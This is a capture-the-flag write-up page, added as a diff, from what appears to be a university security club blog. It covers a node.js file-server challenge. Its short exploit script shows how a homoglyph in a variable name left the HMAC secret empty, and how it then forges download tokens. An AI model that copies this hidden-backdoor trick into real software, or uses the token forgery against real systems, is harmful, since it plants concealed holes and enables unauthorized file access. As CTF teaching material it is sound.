@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Hidden in ρlaιn sιght</title>
+  <meta name="description" content="Write-up">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="/css/bootstrap.css">
+  <script src="/js/jquery-1.10.2.min.js"></script>
+  <script src="/js/bootstrap.min.js"></script>
+  <link rel="canonical" href="http://afnom.net/2014/10/23/12-Hidden-in-Plain-Sight.html">
+  <link rel="alternate" type="application/rss+xml" title="AFiniteNumberOfMonkeys" href="http://afnom.net/feed.xml" />
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <div class="navbar navbar-default navbar-fixed-top">
+      <div class="container">
+        <div class="navbar-header">
+          <a href="http://afnom.net/" class="navbar-brand">AFiniteNumberOfMonkeys</a>
+          <button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+        </div>
+        <div class="navbar-collapse collapse" id="navbar-main">
+          <ul class="nav navbar-nav navbar-right">
+			<li class="dropdown">
+			   <a class="dropdown-toggle" data-toggle="dropdown" href="http://afnom.net" id="home">Home <span class="caret"></span></a>
+			   <ul class="dropdown-menu" aria-labelledby="home">
+			     <li><a href="#who">Who we are</a></li>
+			     <li><a href="#meetings">Meetings</a></li>
+			     <li><a href="#tools">Tools</a></li>
+			     <li><a href="#materials">Learning material</a></li>
+			     <li><a href="#contact">Contact</a></li>
+			   </ul>
+			 </li>
+            <li><a href="http://afnom.net/writeups.html">Write-ups</a></li>
+          </ul>
+
+        </div>
+      </div>
+    </div>
+</div>
+
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+
+
+</header>
+
+
+    <div class="page-content">
+      <div class="container">
+        <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">Hidden in ρlaιn sιght</h1>
+    <p class="post-meta">Oct 23, 2014 • Mihai</p>
+  </header>
+
+  <article class="post-content">
+    <h2 id="write-up">Write-up</h2>
+
+<div class="highlight"><pre><code class="language-js" data-lang="js"><span class="err">#</span><span class="o">!</span><span class="err">/usr/bin/env nodejs</span>
+
+<span class="c1">//Requirements</span>
+<span class="c1">//---------------------------------------------------------------------------</span>
+
+<span class="c1">//At our software development company, one of the top developers left in anger.</span>
+<span class="c1">//He told us that he had hidden a backdoor in our node.js server application – </span>
+<span class="c1">//he thinks that we can&#39;t find it even if we try. I have attached the source code </span>
+<span class="c1">//of our fileserver. After registration, you can log in, upload files and create </span>
+<span class="c1">//access tokens for your files that others can use to retrieve them. He must have </span>
+<span class="c1">//added some way to retrieve files without permission. And we don&#39;t have version control, </span>
+<span class="c1">//so we can&#39;t just check his last commits. We have read the source code multiple times,</span>
+<span class="c1">//but just can&#39;t figure out how he did it. Maybe he just lied? Can you help us and </span>
+<span class="c1">//demonstrate how the backdoor works? We have uploaded a file to “/files/testuser/flag.txt”</span>
+<span class="c1">//please try to retrieve it.</span>
+
+<span class="c1">//Connect to https://wildwildweb.fluxfingers.net:1409/. Note that all your files will be purged every 5 minutes.</span>
+
+<span class="c1">//---------------------------------------------------------------------------</span>
+
+<span class="c1">//1.install nodejs on local computer.</span>
+<span class="c1">//2.setup env to nodejs (if using ubuntu)</span>
+<span class="c1">//3.use the following methods from the downloadable code</span>
+
+<span class="kd">var</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">)</span>
+
+<span class="kd">var</span> <span class="nx">HMAC_SECRET</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="mi">20</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">HMAC_S</span><span class="err">Ε</span><span class="nx">CRET</span> <span class="o">=</span> <span class="nx">HMAC_SECRET</span> <span class="o">+</span> <span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="o">+</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">substr</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="c1">//notice that the output of hmac_sign function in original code is static and depends on user and file.</span>
+<span class="c1">//run function below to generate the download token for any desired user and file combination (e.g. testuser and file flag.txt)</span>
+
+<span class="kd">var</span> <span class="nx">user</span><span class="o">=</span><span class="s2">&quot;testuser&quot;</span>
+<span class="kd">var</span> <span class="nx">file</span><span class="o">=</span><span class="s2">&quot;flag.txt&quot;</span>
+
+<span class="kd">function</span> <span class="nx">hmac_sign</span><span class="p">(</span><span class="nx">user</span><span class="p">,</span><span class="nx">file</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">hmac</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="nx">HMAC_SECRET</span><span class="p">)</span>
+  <span class="nx">hmac</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">user</span><span class="o">+</span><span class="s1">&#39;/&#39;</span><span class="o">+</span><span class="nx">file</span><span class="p">)</span>
+  <span class="k">return</span> <span class="nx">hmac</span><span class="p">.</span><span class="nx">digest</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">hmac_sign</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">))</span>
+<span class="c1">//use token to download flag at:</span>
+<span class="c1">//https://wildwildweb.fluxfingers.net:1409/files/testuser/flag.txt/{token}</span></code></pre></div>
+
+  </article>
+
+</div>
+
+      </div>
+    </div>
+
+    <hr>
+<footer class="site-footer">
+
+  <div class="container">
+
+    <div class="row">
+      <div class="col-lg-12">
+
+       
+        <p><p>Copyright &copy; University of Birmingham 2014</p></p>
+
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
